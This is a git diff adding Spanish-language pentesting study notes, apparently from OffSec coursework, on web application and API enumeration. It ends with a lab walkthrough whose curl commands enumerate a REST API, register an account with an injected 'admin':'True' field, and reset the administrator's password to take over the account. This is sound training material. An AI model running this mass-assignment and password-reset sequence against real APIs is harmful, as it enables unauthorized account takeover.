@@ -674,3 +674,341 @@ Con el conocimiento ya adquirido sobre:
     - **Wappalyzer** (para análisis pasivo del stack tecnológico)
     - **Gobuster** (para fuerza bruta de directorios/archivos)
     - **Burp Suite** (para análisis e interacción avanzada con aplicaciones web)
+
+---
+
+## 8.3. Web Application Enumeration
+
+En este modulo aprenderemos a como depurar código fuente de las aplicaciones web, entender como enumerar e inspeccionar cabeceras, cookies y código fuente y, finalmente entender como realizar pruebas a apis
+
+En el modulo anterior aprendimos como la obtención de información pasiva juega un rol critico cuando mapeamos aplicaciones web, especialmente en repositorios públicos o en google dorks que nos dan información sensible de nuestro objetivo.
+
+Es importante identificar cuales son los componentes tecnológicos de la aplicación web antes de inicializar un ataque. Muchas de las aplicaciones web son tecnológicamente agnósticas, sin embargo, muchos de estos exploits o payloads necesitan ser construidos basados en la infraestructura tecnológica de la aplicación, como el software de las bases de datos o el sistema operativo.
+Antes de lanzar cualquier ataque debemos identificar el stack tecnológico que se utiliza, generalmente estas constan de un sistema operativo anfitrión,  software de servidor web, software de base de datos y un lenguaje de programación frontend y backend
+
+Una vez que hayamos enumerado la pila subyacente utilizando las metodologías aprendidas anteriormente, pasaremos a la enumeración de la aplicación.
+
+Podemos aprovechar diversas técnicas para recopilar esta información directamente del navegador. La mayoría de los navegadores modernos incluyen herramientas para desarrolladores que facilitan el proceso de enumeración.
+
+## 8.3.1. Debugging Page Content
+
+### Inspección de URLs y código fuente en la enumeración web
+
+Un buen punto de partida para mapear una aplicación web es analizar su **URL**. Algunas **extensiones de archivos** visibles en las URLs pueden revelar el lenguaje de programación subyacente:
+
+- Ejemplos comunes:
+
+    - `.php` → PHP
+    
+    - `.jsp`, `.do` → aplicaciones Java
+
+    - `.html` → puede ser estático o dinámico
+
+
+Sin embargo, el uso de extensiones en URLs **ha disminuido**, ya que muchos lenguajes y frameworks modernos utilizan **ruteo lógico (routes)**, donde la URI se asigna internamente a funciones sin depender de extensiones visibles. Esto dificulta deducir la tecnología desde la URL.
+
+
+### Inspección del código fuente con Firefox
+
+Más allá de las URLs, gran parte del contexto útil se encuentra en el **código fuente** de la página web. Para examinarlo, se puede usar la herramienta **Debugger** de Firefox (accesible desde el menú **Web Developer**), que permite:
+
+- Ver recursos cargados por la página
+- Identificar **frameworks JavaScript**
+- Detectar **campos ocultos**, comentarios, scripts, y controles del lado cliente
+
+### Ejemplo práctico:
+
+Para aplicar este enfoque, se propone abrir la herramienta **Debugger** en Firefox mientras se navega por la aplicación `offsecwp`, con el fin de analizar su estructura, recursos y lógica cliente.
+
+![[Pasted image 20251117185101.png]]
+
+Con esto podemos ver que el desarrollador uso jquery version 3.6.0, una libreria comun de javascript (sobretodo en proyectos legacy). En este caso tenemos el codigo en estado minimizado, esto normalmente se usa para gestionar y reducir recursos a nivel de ejecucion, pero podemos ordenarlo con el boton prettier que nos da firefox
+
+![[Pasted image 20251124091316.png]]
+
+Despues de oprimir este boton el codigo se organizara para que sea mucho mas facil de leerlo.
+
+![[Pasted image 20251124091354.png]]
+
+Podemos usar la herramienta de inspector con un elemento especifico de la pagina, este inspector podemos desplegarlo con f12 o con click derecho y seleccionando inspector
+
+![[Pasted image 20251124091528.png]]
+
+Esto abrira el *Html* de la pagina y resaltara el elemento que seleccionamos anteriormente.
+![[Pasted image 20251124091614.png]]
+
+Esta herramienta es especialmente util para encontrar rapidamente elementos ocultos en el aplicativo web
+
+## 8.3.2. Inspecting HTTP Response Headers and Sitemaps
+
+Podemos revisar las respuestas del servidor para obtener informacion adicional. Aqui tenemos dos tipos de herramientas que podemos usar, la primera es un proxy como burp suite, el cual intercepta peticiones y respuestas entre cliente y servidor, y el otro es la herramienta de network del navegador.
+
+En este modulo exploraremos ambas herramientas, podemos empezar con la herramienta Network del navegador. Esta se despliega con f12 o con click derecho inspect, luego seleccionamos el apartado de network y alli podremos ver las peticiones y respuestas realizadas al servidor.
+
+![[Pasted image 20251124092536.png]]
+
+Cuando damos click a la peticion podemos ver informacion adicional, en este caso estamos interesados en la respuesta de las cabeceras
+![[Pasted image 20251124092917.png]]
+
+Aqui podemos ver informacion de la peticion pero principalmente, podemos ver que el servidor backend es un apache con debian con version 2.4.51  
+
+TIP: Los encabezados HTTP no siempre son generados únicamente por el servidor web. Por ejemplo, los proxies web insertan activamente el encabezado X-Forwarded-For para indicar al servidor web la dirección IP del cliente original.
+
+Históricamente, las cabeceras que comenzaban con "X-" se llamaban cabeceras HTTP no estándar. Sin embargo, la RFC6648 ahora desaprueba el uso de "X-" a favor de una convención de nomenclatura más clara.
+
+Los nombres o los valores de las cabeceras de respuesta pueden revelar informacion adicional sobre el stack tecnologico usado en la aplicacion. Algunos ejemplos de cabeceras non-standard inlcuyen _X-Powered-By_, _x-amz-cf-id_, and _X-Aspnet-Version_. Una busqueda dentro de ellos puede revelar informacion adicional como la cabecera "x-amz-cf-id", la cual indica que la aplicacion usa amazon cloudfront.
+
+Los sitemaps son otro elemento importante que debemos tener en cuenta a la hora de enumerar aplicaciones web.
+
+Las aplicaciones web pueden incluir archivos de sitemap para ayudar a los motores de búsqueda a rastrear e indexar sus sitios. Estos archivos también incluyen directivas de qué URLs no rastrear - típicamente páginas sensibles o consolas administrativas, que son exactamente el tipo de páginas en las que estamos interesados.
+
+Las directivas inclusivas se realizan con el protocolo [_sitemaps_](https://www.sitemaps.org/), mientras que robots.txt excluye URLs de ser rastreadas.
+
+```bash
+kali@kali:~$ curl https://www.google.com/robots.txt
+User-agent: *
+Disallow: /search
+Allow: /search/about
+Allow: /search/static
+Allow: /search/howsearchworks
+Disallow: /sdch
+Disallow: /groups
+Disallow: /index.html?
+Disallow: /?
+Allow: /?hl=
+...
+```
+
+Las directivas Permitir y Desautorizar informan a los rastreadores web "educados" sobre qué páginas o directorios pueden ser accedidos o deben ser evitados. En la mayoría de los casos, las páginas y directorios listados pueden no ser interesantes, y algunos incluso pueden ser inválidos. Sin embargo, los archivos de sitemaps no deben pasarse por alto porque pueden contener pistas sobre el diseño del sitio web u otra información interesante, como porciones aún inexploradas del objetivo.
+
+---
+
+## 8.3.3. Enumerating and Abusing APIs
+
+En muchos casos, nuestro objetivo de prueba de penetración es una aplicación web de código cerrado construida internamente que se entrega con varias interfaces de programación de aplicaciones (API). Estas API son responsables de interactuar con la lógica de back-end y proporcionar una columna vertebral sólida de funciones a la aplicación web.
+
+Normalmente vamos a realizar pentesting a API's conocidas como _Representational State Transfer_ (REST), las cuales son usadas para varios propositos incluidos autenticacion. En un escenario de caja blanca tendremos toda la documentacion de la API, la cual nos va a ayudar a realizar un test completo del API. En cambio cuando el escenario es una caja negra, debemos descubrir todo por nosotros mismos.
+
+Podemos usar gobuster para realizar ataques de fuerza bruta a los endpoints del API. En este caso el API gateway web server esta escuchando por el puerto 5001 en 192.168.50.16.
+Las API tambien siguen el apartado de versionamiento por numeros, resultando en un patron como:
+```
+/api_name/v1
+```
+
+Las API por convención tienden a tener nombres descriptivos  nombres especificos, podemos guiarnos de los mismos para poder usar los wordlist y los pattern de gobuster con la opcion -p para proveer el archivo con este dato.
+
+```
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+
+# lo podemos hacer de la siguiente manera:
+echo "{GOBUSTER}/v1" > pattern
+echo "{GOBUSTER}/v2" >> pattern
+```
+
+En este caso estamos usando GOBUSTER  para realizar match con cualquier palabra de nuestra worldlist, la cual tiene tambien un numero de version. Para mantener el test simple usaremos 2 versiones.
+
+```
+kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.50.16:5001
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Patterns:                pattern (1 entries)
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
+===============================================================
+/books/v1             (Status: 200) [Size: 235]
+/console              (Status: 200) [Size: 1985]
+/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
+/users/v1             (Status: 200) [Size: 241]
+```
+
+> **TIP:** Si obtenemos paths como /ui obtendremos la documentacion completa a la API, esto es normal en escenarios de caja blanca pero no en caja negra.
+
+**Inspeccionemos el path /users/v1**
+
+```
+kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 241
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Wed, 06 Apr 2022 09:27:50 GMT
+
+{
+  "users": [
+    {
+      "email": "mail1@mail.com",
+      "username": "name1"
+    },
+    {
+      "email": "mail2@mail.com",
+      "username": "name2"
+    },
+    {
+      "email": "admin@mail.com",
+      "username": "admin"
+    }
+  ]
+}
+```
+
+En este caso la aplicacion a retornado tres cuentas incluidas las de el usuario administrador.
+Ahora usando esta informacion podemos cambiar la estrategia y usar un nuevo comando para que nos busque los paths asociados con el usuario admin usando un wordlist mas sencillo:
+
+```
+kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
+===============================================================
+/email                (Status: 405) [Size: 142]
+/password             (Status: 405) [Size: 142]
+
+===============================================================
+2022/04/06 06:40:35 Finished
+===============================================================
+```
+
+Al parecer nos a devuelto lo que estabamos buscando, un path con informacion de password, podemos continuar ahora realizando una peticion al path.
+
+```
+kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
+HTTP/1.0 405 METHOD NOT ALLOWED
+Content-Type: application/problem+json
+Content-Length: 142
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Wed, 06 Apr 2022 10:58:51 GMT
+
+{
+  "detail": "The method is not allowed for the requested URL.",
+  "status": 405,
+  "title": "Method Not Allowed",
+  "type": "about:blank"
+}
+```
+
+En este caso el API nos dice que el metodo GET no esta permitido, lo mas probable es que sea una peticion http tipo POST y por ello es que no nos arroja un 404 NOT FOUND. Si probamos con otro path tipo Login podremos encontrarnos con lo siguiente:
+
+```
+kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
+HTTP/1.0 404 NOT FOUND
+Content-Type: application/json
+Content-Length: 48
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Wed, 06 Apr 2022 12:04:30 GMT
+
+{ "status": "fail", "message": "User not found"}
+```
+
+En este caso nos habla de un not found pero del user, es decir en el api rest tienen mapeado este 404 como un objeto no encontrado. Ahora sabemos que el usuario es admin y para ver si nuestra estrategia tiene sentido o no podemos usar una password dummy para testear la respuesta.
+
+A continuación, intentaremos convertir la solicitud GET anterior en una solicitud POST y proporcionar nuestra carga útil en el formato JSON requerido. Para crear nuestra solicitud, pasaremos primero el nombre de usuario del administrador y la contraseña ficticia como datos JSON mediante el parámetro -d. También especificaremos "json" como "Content-Type" mediante un nuevo encabezado con -H.
+
+```
+kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+{ "status": "fail", "message": "Password is not correct for the given username."}
+```
+
+El API ha retornado un mensaje que muestra que la autenticacion a fallado, lo que significa que los parametros del api estan correctamente formados.
+
+Como no sabemos la password del usuario admin, intentaremos crear un registro de usuario para ver si es permitido. Esta seria otra estrategia para nuestro ataque.
+
+Vamos a intentar un nuevo ataque registrando un usuario con la siguiente sintaxis agregando la estructura de dato JSON que es necesaria para el body de la peticion:
+
+```
+kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
+
+{ "status": "fail", "message": "'email' is a required property"}
+```
+
+La API respondió con un mensaje de error indicando que también deberíamos incluir una dirección de correo electrónico. Podríamos aprovechar esta oportunidad para determinar si hay alguna clave administrativa que podamos usar indebidamente. Agreguemos la clave de administrador, seguida de un valor "true".
+
+```
+kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
+{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
+```
+
+Nos hemos registrado correctamente y hemos recibido un [_JSON Web Token_](https://en.wikipedia.org/wiki/JSON_Web_Token) (JWT) authentication token. Para obtener pruebas exactas de que tenemos permisos a nivel de administrador, vamos a usar este token para intentar cambiar la password del usuario admin.
+Podemos intentarlos realizando una POST request usando el path password en la API
+
+```
+kali@kali:~$ curl  \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
+  -d '{"password": "pwned"}'
+
+{
+  "detail": "The method is not allowed for the requested URL.",
+  "status": 405,
+  "title": "Method Not Allowed",
+  "type": "about:blank"
+}
+```
+
+Al parecer hemos obtenido un error  405, al estar queriendo cambiar la password de un usuario estamos generando una actualizacion y los metodos http para esto son put y pathc.
+Podemos intentarlo usando el metodo PUT y ver cual sera la salida del mismo.
+
+```
+kali@kali:~$ curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+```
+
+No hemos recibido como tal una respuesta del API, podemos asumir que el backend lo ha procesado sin ningun problema asi que podemos realizar la validacion y ver si tenemos acceso al usuario admin con esta nueva password.
+
+```
+kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
+```
+
+¡Genial! Logramos tomar el control de la cuenta de administrador aprovechando un error lógico de escalada de privilegios presente en la API de registro.
+
+Este tipo de errores de programación ocurren en diversos grados al crear aplicaciones web que dependen de API personalizadas, a menudo debido a la falta de pruebas y las mejores prácticas de codificación segura.
+
+Hasta ahora, hemos recurrido a curl para evaluar manualmente la API del objetivo y así poder comprender mejor todo el flujo de tráfico.
+
+Sin embargo, este enfoque no escalará correctamente cuando el número de API sea significativo. Por suerte, podemos recrear todos los pasos anteriores desde Burp.
+
+A modo de ejemplo, repliquemos el último intento de inicio de sesión del administrador y lo enviemos al proxy añadiendo --proxy 127.0.0.1:8080 al comando. Una vez hecho esto, desde la pestaña Repetidor de Burp, podemos crear una nueva solicitud vacía y rellenarla con los mismos datos que antes.
+
+![[Pasted image 20251201204524.png]]
+
+A continuación, haremos clic en el botón Send y verificaremos la respuesta entrante en el panel derecho.
+
+![[Pasted image 20251201204541.png]]
+
+¡Genial! Logramos recrear el mismo comportamiento en nuestro proxy, lo que, entre otras ventajas, nos permite almacenar cualquier API probada en su base de datos para su posterior análisis.
+
+Una vez que probamos varias API diferentes, pudimos ir a la pestaña Target y luego al Site map. De esta manera, podemos recuperar el mapa completo de las rutas que hemos estado probando hasta el momento.
+
+![[Pasted image 20251201204723.png]]
+
+Desde el site map de burp podemos rastrear la API que descubrimos y reenviar cualquier solicitud guardada al repetidor o al intruso para realizar más pruebas.
+
+---
+
+
+
+
